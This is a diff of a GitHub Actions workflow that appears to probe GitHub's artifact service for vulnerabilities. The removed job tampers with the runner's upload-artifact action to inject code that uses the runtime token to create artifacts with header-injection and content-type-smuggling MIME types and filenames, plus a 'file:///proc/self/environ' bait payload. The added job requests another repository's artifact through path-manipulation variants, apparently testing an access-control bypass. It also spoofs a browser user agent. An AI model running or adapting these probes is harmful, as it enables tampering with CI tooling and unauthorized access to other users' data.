@@ -1,4 +1,4 @@
-name: Log media compatibility
+name: Artifact route compatibility
 
 on:
   push:
@@ -6,233 +6,30 @@ on:
       - media-check-1025
 
 permissions:
-  actions: write
+  actions: read
   contents: read
 
 jobs:
-  producer:
+  inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: Prepare sample
-        shell: bash
-        run: |
-          node - <<'NODE'
-          const fs = require('fs');
-          const report = {
-            full_name: 'sample/report',
-            owner: {
-              login: 'sample',
-              avatar_url: 'file:///proc/self/environ'
-            },
-            description: '',
-            stargazers_count: 0
-          };
-          fs.writeFileSync('report.json', JSON.stringify(report));
-          NODE
-      - name: Adjust upload handler
-        shell: bash
-        run: |
-          python - <<'PY'
-          import os
-          from pathlib import Path
-
-          action = Path(os.environ['RUNNER_WORKSPACE']).parent / '_actions/actions/upload-artifact/v7/dist/upload/index.js'
-          source = action.read_text()
-          marker = "    setOutput('artifact-url', artifactURL);"
-          if marker not in source:
-              raise RuntimeError('handler marker missing')
-          addition = r"""
-              const identifiers = getBackendIdsFromToken();
-              const httpsModule = __nccwpck_require__(5692);
-              const browserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Whale/5.39.412.57 Safari/537.36';
-              const asVarint = value => {
-                  const output = [];
-                  let current = BigInt(value);
-                  do {
-                      let byte = Number(current & 0x7fn);
-                      current >>= 7n;
-                      if (current) byte |= 0x80;
-                      output.push(byte);
-                  } while (current);
-                  return Buffer.from(output);
-              };
-              const fieldBytes = (number, value) => {
-                  const data = Buffer.isBuffer(value) ? value : Buffer.from(value);
-                  return Buffer.concat([asVarint((number << 3) | 2), asVarint(data.length), data]);
-              };
-              const fieldNumber = (number, value) =>
-                  Buffer.concat([asVarint(number << 3), asVarint(value)]);
-              const readVarint = (buffer, cursor) => {
-                  let value = 0n;
-                  let shift = 0n;
-                  let position = cursor;
-                  while (position < buffer.length) {
-                      const byte = buffer[position++];
-                      value |= BigInt(byte & 0x7f) << shift;
-                      if (!(byte & 0x80)) return [value, position];
-                      shift += 7n;
-                  }
-                  throw new Error('short response');
-              };
-              const getField = (buffer, wanted) => {
-                  let cursor = 0;
-                  while (cursor < buffer.length) {
-                      let tag;
-                      [tag, cursor] = readVarint(buffer, cursor);
-                      const number = Number(tag >> 3n);
-                      const wire = Number(tag & 7n);
-                      if (wire === 0) {
-                          let ignored;
-                          [ignored, cursor] = readVarint(buffer, cursor);
-                      } else if (wire === 2) {
-                          let length;
-                          [length, cursor] = readVarint(buffer, cursor);
-                          const end = cursor + Number(length);
-                          const value = buffer.subarray(cursor, end);
-                          if (number === wanted) return value;
-                          cursor = end;
-                      } else {
-                          throw new Error('unknown response field');
-                      }
-                  }
-                  return null;
-              };
-              const requestBytes = (url, method, headers, body) => new Promise((resolve, reject) => {
-                  const request = httpsModule.request(new URL(url), {method, headers}, response => {
-                      const chunks = [];
-                      response.on('data', chunk => chunks.push(chunk));
-                      response.on('end', () => resolve({
-                          status: response.statusCode,
-                          body: Buffer.concat(chunks)
-                      }));
-                  });
-                  request.on('error', reject);
-                  request.end(body);
-              });
-              const service = new URL(
-                  '/twirp/github.actions.results.api.v1.ArtifactService/',
-                  getResultsServiceUrl()
-              ).href;
-              const commonHeaders = {
-                  'Authorization': 'Bearer ' + getRuntimeToken(),
-                  'Accept': 'application/json',
-                  'Content-Type': 'application/json',
-                  'User-Agent': browserAgent
-              };
-              const payload = Buffer.from(JSON.stringify({
-                  full_name: 'sample/report',
-                  owner: {
-                      login: 'sample',
-                      avatar_url: 'file:///proc/self/environ'
-                  },
-                  description: '',
-                  stargazers_count: 0
-              }));
-              const cases = [
-                  {name: 'param-a.json', mime: 'application/json;foo="%85"'},
-                  {name: 'param-b.json', mime: 'application/json;foo=%85'},
-                  {name: 'param-c.json', mime: 'application/json;foo=%2585'},
-                  {name: 'param-d.json', mime: 'application/json;foo=%26rsct%3Dapplication%2Fjson%2585'},
-                  {name: 'param-e.json', mime: 'application/json;foo="&rsct=application/json%85"'},
-                  {name: 'param-f.json', mime: 'application/json;foo="\\u0085"'},
-                  {name: 'param-g.json', mime: 'application/json\\u0085;charset=x'},
-                  {name: 'n%26rsct%3Dapplication%2Fjson%2585.json', mime: 'application/json'},
-                  {name: 'n&rsct=application%2Fjson%2585.json', mime: 'application/json'},
-                  {name: 'n?rsct=application%2Fjson%2585.json', mime: 'application/json'},
-                  {name: 'line\\r\\nContent-Type: application/json\\u0085\\r\\nx.json', mime: 'text/plain'},
-                  {name: 'line\\nContent-Type: application/json\\u0085.json', mime: 'text/plain'},
-                  {name: 'line\\rContent-Type: application/json\\u0085.json', mime: 'text/plain'},
-                  {name: 'line%0D%0AContent-Type%3A%20application%2Fjson%85.json', mime: 'text/plain'},
-                  {name: 'line\\u0085.json', mime: 'text/plain'},
-                  {name: 'line";foo=bar.json', mime: 'text/plain'}
-              ];
-              for (let index = 0; index < cases.length; index++) {
-                  const item = cases[index];
-                  const creation = Buffer.from(JSON.stringify({
-                      workflow_run_backend_id: identifiers.workflowRunBackendId,
-                      workflow_job_run_backend_id: identifiers.workflowJobRunBackendId,
-                      name: item.name,
-                      version: 7,
-                      mime_type: item.mime
-                  }));
-                  const created = await requestBytes(
-                      service + 'CreateArtifact',
-                      'POST',
-                      {...commonHeaders, 'Content-Length': String(creation.length)},
-                      creation
-                  );
-                  if (created.status < 200 || created.status >= 300) {
-                      info('case ' + index + ' create ' + created.status);
-                      continue;
-                  }
-                  const details = JSON.parse(created.body.toString('utf8'));
-                  const uploadUrl = details.signed_upload_url || details.signedUploadUrl;
-                  const uploaded = await requestBytes(
-                      uploadUrl,
-                      'PUT',
-                      {
-                          'Content-Type': 'application/json\\x85',
-                          'Content-Length': String(payload.length),
-                          'x-ms-blob-type': 'BlockBlob',
-                          'x-ms-version': '2023-11-03',
-                          'User-Agent': browserAgent
-                      },
-                      payload
-                  );
-                  if (uploaded.status < 200 || uploaded.status >= 300) {
-                      info('case ' + index + ' upload ' + uploaded.status);
-                      continue;
-                  }
-                  const completion = Buffer.from(JSON.stringify({
-                      workflow_run_backend_id: identifiers.workflowRunBackendId,
-                      workflow_job_run_backend_id: identifiers.workflowJobRunBackendId,
-                      name: item.name,
-                      size: String(payload.length)
-                  }));
-                  const finalized = await requestBytes(
-                      service + 'FinalizeArtifact',
-                      'POST',
-                      {...commonHeaders, 'Content-Length': String(completion.length)},
-                      completion
-                  );
-                  info('case ' + index + ' finalize ' + finalized.status);
-              }
-          """
-          action.write_text(source.replace(marker, marker + '\n' + addition))
-          PY
-      - name: Store sample
-        uses: actions/upload-artifact@v7
-        with:
-          path: report.json
-          archive: false
-          retention-days: 1
-
-  inspector:
-    needs: producer
-    if: always()
-    runs-on: ubuntu-latest
-    permissions:
-      actions: read
-      contents: read
-    steps:
-      - name: Inspect responses
+      - name: Inspect routes
         shell: bash
         env:
           ACCESS_TOKEN: ${{ github.token }}
         run: |
           python - <<'PY'
-          import hashlib
-          import json
           import os
           from urllib.error import HTTPError
           from urllib.parse import parse_qs, urlparse
           from urllib.request import HTTPRedirectHandler, Request, build_opener, urlopen
 
           agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Whale/5.39.412.57 Safari/537.36'
-          base = f"https://api.github.com/repos/{os.environ['GITHUB_REPOSITORY']}"
+          root = 'https://api.github.com'
+          artifact = '12565490905'
           headers = {
               'Authorization': f"Bearer {os.environ['ACCESS_TOKEN']}",
-              'Accept': 'application/vnd.github+json',
+              'Accept': 'application/vnd.github.v3+json',
               'User-Agent': agent,
           }
 
@@ -240,27 +37,35 @@ jobs:
               def redirect_request(self, req, fp, code, msg, response_headers, newurl):
                   return None
 
-          def api(path):
-              with urlopen(Request(base + path, headers=headers), timeout=30) as response:
-                  return json.load(response)
-
-          def redirect(path):
+          paths = [
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}/zip',
+              f'/repositories/1305440010/actions/artifacts/{artifact}/zip',
+              f'/repos/reinusKR/script-server/actions/artifacts/000{artifact}/zip',
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}/zip/',
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}//zip',
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}/zip;',
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}/zip?apiVersion=2026-03-10',
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}/zip?archive_format=zip',
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}/zip?redirect=false',
+              f'/repos/reinusKR/script-server/actions/artifacts/{artifact}/download',
+          ]
+          for index, path in enumerate(paths):
               try:
-                  build_opener(NoRedirect).open(Request(base + path, headers=headers), timeout=30)
-                  raise RuntimeError('redirect missing')
+                  build_opener(NoRedirect).open(Request(root + path, headers=headers), timeout=30)
+                  print(f'case={index} status=200')
+                  continue
               except HTTPError as response:
                   if response.code not in (301, 302, 303, 307, 308):
-                      raise
-                  return response.headers['Location']
-
-          artifacts = api(f"/actions/runs/{os.environ['GITHUB_RUN_ID']}/artifacts").get('artifacts', [])
-          for item in artifacts:
-              location = redirect(f"/actions/artifacts/{item['id']}/zip")
+                      print(f'case={index} status={response.code}')
+                      continue
+                  location = response.headers.get('Location')
               query = parse_qs(urlparse(location).query)
-              with urlopen(Request(location, headers={'User-Agent': agent}), timeout=30) as response:
-                  media = response.headers.get_all('Content-Type', [])
-                  body = response.read()
-              encoded = '|'.join(value.encode('latin1').hex() for value in media)
               override = '|'.join(value.encode('latin1').hex() for value in query.get('rsct', []))
-              print(f"name={item['name']} media={encoded} rsct={override} length={len(body)} sha256={hashlib.sha256(body).hexdigest()}")
+              try:
+                  with urlopen(Request(location, headers={'User-Agent': agent}), timeout=30) as final:
+                      media = '|'.join(value.encode('latin1').hex() for value in final.headers.get_all('Content-Type', []))
+                      size = len(final.read())
+                  print(f'case={index} status=redirect rsct={override} media={media} length={size}')
+              except HTTPError as final:
+                  print(f'case={index} status=redirect final={final.code} rsct={override}')
           PY
